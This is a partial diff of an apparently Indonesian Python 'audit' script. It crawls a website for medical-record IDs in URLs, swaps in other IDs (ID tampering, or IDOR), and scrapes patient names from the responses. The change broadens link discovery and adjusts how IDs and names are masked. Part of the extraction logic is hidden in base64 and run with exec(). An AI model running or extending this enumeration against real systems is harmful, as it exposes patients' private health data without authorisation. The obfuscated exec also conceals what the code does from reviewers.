@@ -100,8 +100,8 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 'Data ditemukan'.
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOntmb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHttYXNrfScp"))
+        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 2 digits RM masking.
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOioqKioqKioqe2Zvcm1hdHRlZF9pZFstMjpdfSAtIHttYXNrfScp"))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -142,21 +142,27 @@ def parameter_discovery_audit():
         soup = BeautifulSoup(res.text, 'html.parser')
         links = soup.find_all('a', href=True)
         
-        # Mencari tautan yang mengandung pola angka (ID Rekam Medis)
+        discovered_urls = []
         potential_targets = []
         for link in links:
             href = link['href']
-            match = re.search(r'/(\d{6,12})', href)
-            if match and "logout" not in href.lower():
-                potential_targets.append((href, match.group(1)))
-        
+            if href not in discovered_urls and "logout" not in href.lower() and href.startswith('http'):
+                discovered_urls.append(href)
+                match = re.search(r'/(\d{6,12})', href)
+                if match:
+                    potential_targets.append((href, match.group(1)))
+
+        if discovered_urls:
+            print(f"\n[+] Discovered {len(discovered_urls)} unique internal links:")
+            for d in discovered_urls:
+                print(f" [\033[93m!\033[0m] URL: {d}")
+
         if potential_targets:
-            print(f"\n[+] Detected {len(potential_targets)} potential Path Variable targets.")
-            
-            # 1. Randomization: Memilih satu target secara acak untuk diuji
+            print(f"\n[*] Initiating Automated Manipulation Test on Path Variables...")
+            # 1. Randomization: Memilih satu target secara acak untuk diuji sebagai PoC
             base_url, original_id = random.choice(potential_targets)
-            masked_original = "*" * (len(original_id) - 1) + original_id[-1]
-            print(f"[*] Random Target Selected: {base_url.replace(original_id, masked_original)}")
+            masked_original = "*" * (len(original_id) - 2) + original_id[-2:]
+            print(f"[*] Random PoC Target: {base_url.replace(original_id, masked_original)}")
             
             # 2. Automated Manipulation Test
             print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
@@ -171,7 +177,7 @@ def parameter_discovery_audit():
             
             # Mendeteksi apakah manipulasi berhasil (mencari tag nama pasien)
             name_tag = test_soup.find('p', class_='sale-price text-success')
-            masked_test_id = "*" * (len(test_id) - 1) + test_id[-1]
+            masked_test_id = "*" * (len(test_id) - 2) + test_id[-2:]
             
             if name_tag:
                 name = name_tag.get_text(strip=True)
